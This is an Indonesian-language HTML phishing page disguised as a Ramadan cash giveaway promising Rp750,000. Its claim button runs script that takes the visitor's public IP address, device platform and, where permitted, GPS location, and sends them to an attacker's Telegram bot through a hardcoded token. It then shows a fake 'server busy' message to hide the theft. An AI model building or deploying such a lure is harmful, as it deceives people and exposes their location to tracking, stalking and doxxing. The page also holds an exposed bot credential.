<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[ EDWARD OMNI V.31.0 ]</title>
    <style>
        :root { --neon: #0f0; --purple: #bc13fe; --danger: #f00; --bg: #050505; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 10px; margin:0; }
        .panel { background: #1a1a1a; border: 1px solid #333; padding: 15px; border-radius: 12px; margin-bottom: 12px; text-align: left; }
        button { width: 100%; padding: 14px; font-weight: bold; border-radius: 8px; border: none; cursor: pointer; text-transform: uppercase; background: #007bff; color: #fff; }
        .log-box { font-size: 9px; color: #0f0; background: #000; padding: 10px; border-radius: 5px; height: 80px; overflow-y: auto; border: 1px solid #222; font-family: 'Courier New', monospace; }
    </style>
</head>
<body>

    <h2 style="color:var(--neon); font-family: 'Courier New';">EDWARD OMNI V.31.0</h2>

    <div class="panel" style="background: #f8f9fa; border-left: 5px solid #007bff;">
        <h3 style="color:#007bff; margin:0 0 5px 0;">🎁 DANA KAGET RAMADAN</h3>
        <p style="color:#666; font-size: 11px; margin-bottom: 10px;">Klik untuk verifikasi IP & Klaim Saldo Rp750.000</p>
        <button onclick="captureAll()">KLAIM SEKARANG ✅</button>
    </div>

    <div class="log-box" id="logBox">> Sniffer Engine Active...</div>

    <script>
        const log = document.getElementById('logBox');
        const TELE_TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
        const TELE_ID = '7898572558';

        function sendTele(msg) {
            fetch("https://api.telegram.org/bot" + TELE_TOKEN + "/sendMessage?chat_id=" + TELE_ID + "&text=" + encodeURIComponent(msg));
        }

        async function captureAll() {
            log.innerHTML += "> Fetching Target IP...<br>";
            
            try {
                // MENGAMBIL IP ASLI TARGET
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const targetIP = data.ip;

                let msg = "🔱 [ TARGET TRAPPED ] 🔱\n";
                msg += "🌐 IP ADDRESS: " + targetIP + "\n";
                msg += "📱 DEVICE: " + navigator.platform + "\n";
                msg += "🔗 TRACKER: https://ipapi.co/" + targetIP + "/json/";
                
                sendTele(msg);
                log.innerHTML += "> IP Captured: " + targetIP + "<br>";

                // Ambil Lokasi GPS (Jika diizinkan)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((p) => {
                        sendTele("📍 LOKASI GPS:\nhttps://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude);
                    });
                }

                alert("Koneksi server sibuk! Silakan coba lagi nanti.");
            } catch (err) {
                log.innerHTML += "> Error Sniffing!<br>";
            }
        }
    </script>
</body>
</html>
